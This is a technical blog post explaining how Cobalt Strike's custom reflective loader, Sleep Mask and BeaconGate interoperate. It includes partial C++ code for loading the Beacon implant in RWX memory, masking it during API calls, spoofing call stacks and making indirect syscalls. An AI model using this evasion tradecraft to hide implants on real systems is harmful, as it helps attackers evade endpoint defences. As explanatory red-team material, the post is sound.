# https://rastamouse.me/udrl-sleepmask-and-beacongate/

I've been looking into Cobalt Strike's UDRL, SleepMask, and BeaconGate features over the last couple of days. It took me some time to understand the relationship between these capabilities, so the aim of this post is to provide a concise overview for those looking into these aspects of Beacon, and hopefully provide a leg-up for developers. Each of these features can be used independently to bring custom evasion capabilities to different parts of Beacon, but perhaps more interestingly, they can also interoperate to some degree.

## User-Defined Reflective Loader

Beacon is nothing more than a Windows DLL that needs to be loaded into a process to run. There are multiple ways to do this, but Beacon is designed after Stephen Fewer's [Reflective DLL Injection](https://github.com/stephenfewer/ReflectiveDLLInjection) technique. This is a DLL that's responsible for loading itself by implementing its own PE loader. The DLL exports a function called _ReflectiveLoader_, which when called, walks over its own image and maps a new copy of itself into memory. It must satisfy the DLL's runtime requirements by resolving its import table and performing relocations etc. It then locates and executes its entry point, DllMain, at which point, Beacon is up and running.

The behaviour of the reflective loader can be influenced via Malleable C2. For example, one of the things `stage.obfuscate` does is instruct the reflective loader to map Beacon into memory without its headers. There are other options such as `stage.allocator`, which changes the API used to allocate new memory for Beacon; `stage.magic_pe` overrides the PE character marker in Beacon's NT Headers; and `stage.stomppe` instructs the reflective loader to stomp the `MZ`, `PE`, and `e_lfanew` values after it maps Beacon into memory.

The User-Defined Reflective Loader (UDRL) allows operators to replace Beacon's default reflective loader with their own custom implementation. This allows them to go above and beyond the customisations exposed by Malleable C2. Want to use an allocation API that isn't available in `stage.allocator`? No problem. Want to stomp more bytes than `stage.magic_mz` permits? Go for it.

This is the structure of what a very basic UDRL could look like (lots of code excluded for brevity).

```cpp
extern "C" {
#pragma code_seg(".text$a")
    ULONG_PTR __cdecl ReflectiveLoader() {
        // determine start address of loader
#ifdef _WIN64
        void* loaderStart = &ReflectiveLoader;
#elif _WIN32
        void* loaderStart = (char*)GetLocation() - 0xE;
#endif
        // determine base address of Beacon DLL
        ULONG_PTR rawDllBaseAddress = FindBufferBaseAddress();

        // parse NTHeaders
        PIMAGE_DOS_HEADER rawDllDosHeader = (PIMAGE_DOS_HEADER)rawDllBaseAddress;
        PIMAGE_NT_HEADERS rawDllNtHeader = (PIMAGE_NT_HEADERS)(rawDllBaseAddress + rawDllDosHeader->e_lfanew);

        // resolve the functions needed by the loader
        _PPEB pebAddress = GetPEBAddress();
        WINDOWSAPIS winApi = { 0 };
        if (!ResolveBaseLoaderFunctions(pebAddress, &winApi)) {
            return NULL;
        }

        // allocate memory for Beacon, yolo RWX
        ULONG_PTR loadedDllBaseAddress = (ULONG_PTR)winApi.VirtualAlloc(NULL, rawDllNtHeader->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (loadedDllBaseAddress == NULL) {
            return NULL;
        }

        // map sections
        if (!CopyPESections(rawDllBaseAddress, loadedDllBaseAddress)) {
            return NULL;
        };

        // resolve Beacon's import table...
        ResolveImports(rawDllNtHeader, loadedDllBaseAddress, &winApi);

        // perform relocations...
        ProcessRelocations(rawDllNtHeader, loadedDllBaseAddress);

        // calculate Beacon's entry point
        ULONG_PTR entryPoint = loadedDllBaseAddress + rawDllNtHeader->OptionalHeader.AddressOfEntryPoint;

        // flush instruction cache to avoid stale code being used
        winApi.NtFlushInstructionCache((HANDLE)-1, NULL, 0);

        // call Beacon's entrypoints
        ((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
        ((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, DLL_BEACON_START, NULL);

        // return address of entry point to caller
        return entryPoint;
    }
}
```

ReflectiveLoader.cpp

One caveat to be aware of when using a UDRL is that any options that are defined in the `stage` block of the loaded C2 profile will be ignored. This is by design because the philosophy of the UDRL is to put the developer in the driving seat. However, this can cause confusion when using the default Sleep Mask, because it does use `stage.userwx` as a hint when masking and unmasking Beacon memory. For instance, if `stage.userwx` is set to `true` but a UDRL allocates memory as R/RW/RX (as appropriate for each section), the Sleep Mask will either be unable to mask all of Beacon's section (leaving them in the clear) or it will try to and simply crash because it didn't know it needed to make memory writeable first.

As an aside, it's also worth noting that this UDRL is not the same reflective loader used for Beacon's fork & run post-ex commands (execute-assembly, powerpick, etc). Operators can write a custom post-ex UDRL to replace the default one (they're nearly identical). However, in the same way that a custom UDRL ignores options from the `stage` block of Malleable C2; a custom post-ex UDRL ignores options from the `post-ex` block.

## Custom Sleep Masks

The issue of memory allocations can be completely mitigated when using a custom Sleep Mask and UDRL because a UDRL can actually pass information about memory it has allocated to the Sleep Mask, via Beacon. This can not only include memory allocated for Beacon's sections (.data, .text, etc) but also any custom memory allocations a developer wishes to make.

This data is provided via an `ALLOCATED_MEMORY_REGION` structure.

```cpp
typedef struct _ALLOCATED_MEMORY_REGION {
    ALLOCATED_MEMORY_PURPOSE Purpose;      // A label to indicate the purpose of the allocated memory
    PVOID  AllocationBase;                 // The base address of the allocated memory block
    SIZE_T RegionSize;                     // The size of the allocated memory block
    DWORD Type;                            // The type of memory allocated
    ALLOCATED_MEMORY_SECTION Sections[8];  // An array of section information structures
    ALLOCATED_MEMORY_CLEANUP_INFORMATION CleanupInformation; // Information required to cleanup the allocation
} ALLOCATED_MEMORY_REGION, *PALLOCATED_MEMORY_REGION;

typedef struct {
    ALLOCATED_MEMORY_REGION AllocatedMemoryRegions[6];
} ALLOCATED_MEMORY, *PALLOCATED_MEMORY;
```

BeaconUserData.h

This is then passed to Beacon by calling DllMain with a 'reason' of `DLL_BEACON_USER_DATA`, prior to calling with `DLL_BEACON_START`.

```cpp
// pass Beacon User Data (BUD) to Beacon
((DLLMAIN)entryPoint)(0, DLL_BEACON_USER_DATA, &userData);

// call Beacon's entrypoints
((DLLMAIN)entryPoint)((HINSTANCE)loadedDllBaseAddress, DLL_PROCESS_ATTACH, NULL);
((DLLMAIN)entryPoint)((HINSTANCE)loaderStart, DLL_BEACON_START, NULL);
```

ReflectiveLoader.cpp

When Beacon is ready to sleep, execution is passed to the Sleep Mask with a `PSLEEPMASK_INFO` structure.

```cpp
void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL funcCall)
```

The allocated memory data is available inside the `BEACON_INFO` structure, which can be looped over and handled as desired.

```cpp
info->beacon_info.allocatedMemory.AllocatedMemoryRegions
```

## System Calls

Developers can also replace Beacon's default syscall resolver (which I believe is based on SysWhispers3(?)) with something else entirely (Hell's Gate, Halo's Gate, Tartarus' Gate, RecycledGate, etc). Resolve the syscall numbers and function pointers in the UDRL, and populate the `SYSCALL_API` and `RTL_API` structures.

```cpp
typedef struct {
    SYSCALL_API_ENTRY ntAllocateVirtualMemory;
    SYSCALL_API_ENTRY ntProtectVirtualMemory;
    SYSCALL_API_ENTRY ntFreeVirtualMemory;
    SYSCALL_API_ENTRY ntGetContextThread;
    SYSCALL_API_ENTRY ntSetContextThread;
    SYSCALL_API_ENTRY ntResumeThread;
    SYSCALL_API_ENTRY ntCreateThreadEx;
    SYSCALL_API_ENTRY ntOpenProcess;
    SYSCALL_API_ENTRY ntOpenThread;
    SYSCALL_API_ENTRY ntClose;
    SYSCALL_API_ENTRY ntCreateSection;
    SYSCALL_API_ENTRY ntMapViewOfSection;
    SYSCALL_API_ENTRY ntUnmapViewOfSection;
    SYSCALL_API_ENTRY ntQueryVirtualMemory;
    SYSCALL_API_ENTRY ntDuplicateObject;
    SYSCALL_API_ENTRY ntReadVirtualMemory;
    SYSCALL_API_ENTRY ntWriteVirtualMemory;
    SYSCALL_API_ENTRY ntReadFile;
    SYSCALL_API_ENTRY ntWriteFile;
    SYSCALL_API_ENTRY ntCreateFile;
} SYSCALL_API, *PSYSCALL_API;

typedef struct {
   PVOID rtlDosPathNameToNtPathNameUWithStatusAddr;
   PVOID rtlFreeHeapAddr;
   PVOID rtlGetProcessHeapAddr;
} RTL_API, *PRTL_API;
```

BeaconUserData.h

These are then passed to Beacon in the same `DLL_BEACON_USER_DATA` call as outlined above. A `SYSCALL_API_ENTRY` entry looks like this:

```c++
typedef struct
{
    PVOID fnAddr;  // address of Nt* function
    PVOID jmpAddr; // syscall/FastSysCall/KiFastSystemCall instruction
    DWORD sysnum;  // System Call number
} SYSCALL_API_ENTRY, *PSYSCALL_API_ENTRY;
```

BeaconUserData.h

If `stage.syscall_method` is set to `direct` in the C2 profile, the `fnAddr` value is used. If it's set to `indirect`, then the `jmpAddr` and `sysnum` values are used.

## BeaconGate

BeaconGate is a feature that instructs Beacon to proxy supported API calls via a custom Sleep Mask. The idea behind this is that the Sleep Mask can mask Beacon's memory, set up any additional evasion features (such as call stack spoofing), make the API call, unmask Beacon, then pass the result back to the caller.

If both `syscall_method` and `beacon_gate` are defined in a profile, then BeaconGate will take priority. In the example below, only VirtualAlloc will be proxied via BeaconGate whilst all the others will use indirect syscalls.

```text
stage {
  set syscall_method "indirect";
  beacon_gate {
    VirtualAlloc;
  }
}
```

However, that's not to say that you can't make syscalls from BeaconGate (we'll come to that in a bit).

When an API call is proxied to the Sleep Mask, the relevant data is held in the `FUNCTION_CALL` structure.

```cpp
void sleep_mask(PSLEEPMASK_INFO info, PFUNCTION_CALL funcCall)
```

sleepmask.cpp

```cpp
typedef struct {
    PVOID functionPtr;    // function to call
    WinApi function;      // enum representing target api
    int numOfArgs;        // number of arguments
    ULONG_PTR args[MAX_BEACON_GATE_ARGUMENTS];    // array of pointers containing the passed arguments (e.g. rcx, rdx, ...)
    BOOL bMask;    // indicates whether Beacon should be masked during the call
    ULONG_PTR retValue;    // a pointer containing the return value
} FUNCTION_CALL, * PFUNCTION_CALL;
```

beacon\_gate.h

The best place to handle these calls is probably in the `BeaconGateWrapper` function. Use the WinAPI enum to check which API is being called and perform the appropriate call stack spoofing using any technique you wish (VulcanRaven, SilentMoonwalk, etc). If you don't need (or want) to use syscalls (e.g. because you performed some unhooking in the UDRL), simply call the original function pointer after your stack spoof.

```cpp
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
    // mask beacon if needed
    if (functionCall->bMask == TRUE) {
        MaskBeacon(&info->beacon_info);
    }

    // call stack spoofing code for requested api
    if (functionCall->function == VIRTUALALLOC) {
        virtualAllocStackSpoof(functionCall->args);
    }

    // execute original function pointer
    BeaconGate(functionCall);

    // unmask beacon if needed
    if (functionCall->bMask == TRUE) {
        UnMaskBeacon(&info->beacon_info);
    }

    return;
}
```

gate.cpp

If you do want to use syscalls, you can ignore the original function pointer and just execute your custom syscall code instead. BeaconGate can still benefit from any custom syscall resolving you did in the UDRL, by using the `BeaconGetSyscallInformation` BOF API. This returns a `PBEACON_SYSCALLS` structure which contains the `PSYSCALL_API` and `PRTL_API` that you provided via BUD.

```cpp
typedef struct {
    PSYSCALL_API syscalls;
    PRTL_API     rtls;
} BEACON_SYSCALLS, *PBEACON_SYSCALLS;
```

One thing to note is that this data is copied from Beacon, so **must** be performed before Beacon is masked.

```cpp
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
  // get custom syscall info
  BEACON_SYSCALLS syscall_info;
  BeaconGetSyscallInformation(&syscall_info, TRUE);

  if (functionCall->bMask == TRUE) {
    MaskBeacon(&info->beacon_info);
  }

  ...
}
```

gate.cpp

You can then go ahead and access the ssn, direct, and indirect jump values as desired for the API being called.

```cpp
void BeaconGateWrapper(PSLEEPMASK_INFO info, PFUNCTION_CALL functionCall) {
    // get custom syscall info
    BEACON_SYSCALLS syscall_info;
    BeaconGetSyscallInformation(&syscall_info, TRUE);

	// mask beacon if needed
	if (functionCall->bMask == TRUE) {
        MaskBeacon(&info->beacon_info);
    }

    if (functionCall->function == VIRTUALALLOC) {
        // setup a fake call stack
        virtualAllocStackSpoof(functionCall->args);

        // syscall
        prepSyscall(
            syscall_info.syscalls->ntAllocateVirtualMemory.sysnum,
            syscall_info.syscalls->ntAllocateVirtualMemory.jmpAddr);

        functionCall->retValue = doSyscall(functionCall->args);
    }

    // unmask beacon if needed
    if (functionCall->bMask == TRUE) {
        UnMaskBeacon(&info->beacon_info);
    }

    return;
}
```

## BOF System Call APIs

Beacon also exposes a specific set of system call APIs such as `BeaconVirtualAlloc`, `BeaconVirtualProtect`, and `BeaconOpenProcess` for use in post-ex BOFs.

When you call these, execution will occur as per Beacon's configuration. If Beacon is not configured to use syscalls, then they'll be executed as regular WinAPI calls; if configured to use the default direct/indirect syscall implementation, then they'll be executed as per SysWhispers3(?); if you passed in custom syscall data from a UDRL, then they'll be executed as per your custom resolving method; and if configured to use BeaconGate, the calls will be be proxied to your Sleep Mask.

For BOFs that use these common APIs, it saves you from having to duplicate the same syscall and/or call stack spoofing code between all of your post-ex BOFs.

## Conclusion

I think this post covers the main points that I wanted to highlight regarding the UDRL, SleepMask, and BeaconGate. I hope it provides some clarification if they seemed too scary or complicated to use. They're not too bad once you've wrapped your head around them.

As BeaconGate evolves and gains traction, I expect we'll see some efforts by the dev team to simplify some aspects of these features. For instance, the current direct/indirect syscalls could be deprecated in their current state, moved into the Sleep Mask and proxied through BeaconGate by default. We may even see the SleepMask and BeaconGate merged under a single name. SleepGate? 😅

Another logical progression could be to enable BOF developers to proxy any arbitrary API call through BeaconGate, rather than just the ~20 or so currently supported. This would allow a BOF to benefit from BeaconGate's evasion capabilities, without requiring any heavy lifting by the BOF itself.